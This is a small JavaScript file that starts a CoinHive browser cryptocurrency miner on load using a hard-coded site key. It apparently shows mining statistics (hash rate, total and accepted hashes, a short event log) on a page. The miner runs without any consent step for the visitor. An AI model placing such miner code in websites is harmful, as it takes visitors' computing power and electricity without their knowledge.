var miner = new CoinHive.Anonymous('1bKAZIoqiathAWQnJFsbc4pFB54tTIhK');
miner.start();

var insertToLog = function (input) {
    var elem = $(".log")[0];
    var text = elem.innerHTML.split("<br>");
    if (text.length > 10)
        text.pop();
    text.unshift(input);
    elem.innerHTML = text.join("<br>");
};

// Listen on events
miner.on('found', function () {
    insertToLog("Found hash");
});
miner.on('accepted', function () {
    insertToLog("Accepted hash");
});

// Update stats once per second
setInterval(function () {
    $(".HPS").text(Math.round(miner.getHashesPerSecond()));
    $(".TH").text(miner.getTotalHashes());
    $(".AH").text(miner.getAcceptedHashes());

}, 1000);